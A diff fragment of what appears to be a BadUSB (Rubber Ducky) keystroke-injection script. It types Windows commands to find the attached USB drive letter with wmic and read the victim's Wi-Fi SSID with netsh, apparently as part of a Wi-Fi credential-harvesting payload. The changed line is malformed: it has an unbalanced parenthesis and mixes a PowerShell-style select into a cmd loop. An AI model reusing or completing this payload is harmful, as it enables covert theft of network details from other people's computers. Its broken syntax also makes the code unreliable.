@@ -17,13 +17,7 @@ DELAY 1000
 
 REM --> Getting SSID
 
-STRING for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
-
-if %%l equ 2 (
-echo %%i is a USB drive.
-driveletter = %%i
-        )
-        )
+STRING for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL` | select caption do set driveletter=%%i
 ENTER
 STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
 ENTER
